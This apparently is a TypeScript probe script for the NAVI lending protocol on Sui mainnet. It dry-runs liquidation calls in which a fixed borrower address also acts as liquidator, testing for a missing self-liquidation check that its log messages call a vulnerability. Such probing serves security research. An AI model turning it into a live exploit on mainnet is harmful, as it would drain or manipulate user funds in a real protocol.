import { SuiClient } from "@mysten/sui/client";
import { Transaction } from "@mysten/sui/transactions";

const client = new SuiClient({ url: "https://fullnode.mainnet.sui.io:443" });

const NAVI_MAIN_PKG = "0xee0041239b89564ce870a7dec5ddc5d114367ab94a1137e90aa0633cb76518e0";
const STORAGE     = "0xbb4e2f4b6205c2e2a2db47aeb4f830796ec7c005f88537ee775986639bc442fe";
const SUI_POOL    = "0x96df0fce3c471489f4debaaa762cf960b3d97820bd1f3f025ff8190730e958c5";
const POOL_USDC   = "0xa02a98f9c88db51c6f5efaaf2261c81f34dd56d86073387e0ef1805ca22e39c8";
const ORACLE_OBJ  = "0x1568865ed9a0b5ec414220e8f79b3d04c77acc82358f6e5ae4635687392ffbef";
const INCENTIVE_V2= "0xf87a8acb8b81d14307894d12595541a73f19933f88e1326d5be349c7a6f7559c";
const INCENTIVE_V3= "0x62982dad27fb10bb314b3384d5de8d2ac2d72ab2dbeae5d801dbdb9efa816c80";
const CLOCK       = "0x0000000000000000000000000000000000000000000000000000000000000006";
const SUI_SYSTEM  = "0x0000000000000000000000000000000000000000000000000000000000000005";

const BORROWER = "0x3f40bc9aca5e62681904762ef2c04161d9fd142fe4dc2e5348f71cf2cf5207fa";
const SUI_TYPE    = "0x2::sui::SUI";
const USDC_TYPE   = "0x5d4b302506645c37ff133b98c4b50a5ae14841659738d6d733d59d0d217a93bf::coin::COIN";

// Test 1: SUI debt, SUI collat, but debt_pool != collat_pool issue
// Actually with SUI/SUI liquidation the same pool is used for both
// Instead let's use a different approach: use entry_liquidation (non-v2) 
// which has fewer params and doesn't need SuiSystem

async function testEntryLiquidationSelfV1() {
  console.log("=== Test: entry_liquidation (no SuiSystem) with sender=borrower ===");
  
  const tx = new Transaction();
  tx.setSender(BORROWER);
  
  // entry_liquidation: clock, oracle, storage, debt_id, pool_debt, coin_debt, 
  //                    collat_id, pool_collat, borrower_addr, amount, incentive_v2, incentive_v3, ctx
  // For SUI collat with USDC debt:
  const [debtCoin] = tx.splitCoins(tx.gas, [tx.pure.u64(1_000_000)]); // 1 USDC-worth but as SUI
  
  // Try: sender as borrower (debt=0=SUI collat, also SUI debt for simplicity - same pool)
  // Actually need two different pools, so use USDC debt + SUI collat
  
  tx.moveCall({
    target: `${NAVI_MAIN_PKG}::incentive_v3::entry_liquidation`,
    typeArguments: [SUI_TYPE, SUI_TYPE], // debt=SUI, collat=SUI (same pool issue)
    arguments: [
      tx.object(CLOCK),
      tx.object(ORACLE_OBJ),
      tx.object(STORAGE),
      tx.pure.u8(0), // debt asset = 0 (SUI)
      tx.object(SUI_POOL),
      debtCoin,
      tx.pure.u8(0), // collat asset = 0 (SUI) 
      tx.object(SUI_POOL), // same SUI pool - will this fail on duplicate mutable borrow?
      tx.pure.address(BORROWER), // borrower = sender
      tx.pure.u64(1_000_000),
      tx.object(INCENTIVE_V2),
      tx.object(INCENTIVE_V3),
    ],
  });
  
  const result = await client.devInspectTransactionBlock({
    transactionBlock: tx,
    sender: BORROWER,
  });
  
  const status = result.effects?.status?.status;
  const error = result.effects?.status?.error ?? "";
  console.log("Status:", status);
  console.log("Error:", error.slice(0, 800));
  
  return { status, error };
}

// Test 2: Use when_liquidatable directly to confirm the gap
async function testWhenLiquidatableRealBorrower() {
  console.log("\n=== Test: when_liquidatable(storage, BORROWER, BORROWER) ===");
  const NAVI_V15_PKG = "0x1e4a13a0494d5facdbe8473e74127b838c2d446ecec0ce262e2eddafa77259cb";
  
  const tx = new Transaction();
  tx.setSender(BORROWER);
  
  tx.moveCall({
    target: `${NAVI_V15_PKG}::storage::when_liquidatable`,
    arguments: [
      tx.object(STORAGE),
      tx.pure.address(BORROWER), // borrower
      tx.pure.address(BORROWER), // liquidator = same = SELF
    ],
  });
  
  const result = await client.devInspectTransactionBlock({
    transactionBlock: tx,
    sender: BORROWER,
  });
  
  const status = result.effects?.status?.status;
  const error = result.effects?.status?.error ?? "";
  console.log("Status:", status);
  console.log("Error:", error.slice(0, 500));
  
  if (status === "success") {
    console.log("\n*** when_liquidatable(self=borrower, self=liquidator) = SUCCESS ***");
    console.log("*** This confirms NO self-liquidation guard at the storage check level ***");
    console.log("*** The vulnerability exists IF the main entry function also lacks the check ***");
  }
  
  return { status, error };
}

async function main() {
  await testEntryLiquidationSelfV1();
  await testWhenLiquidatableRealBorrower();
}

main().catch(console.error);
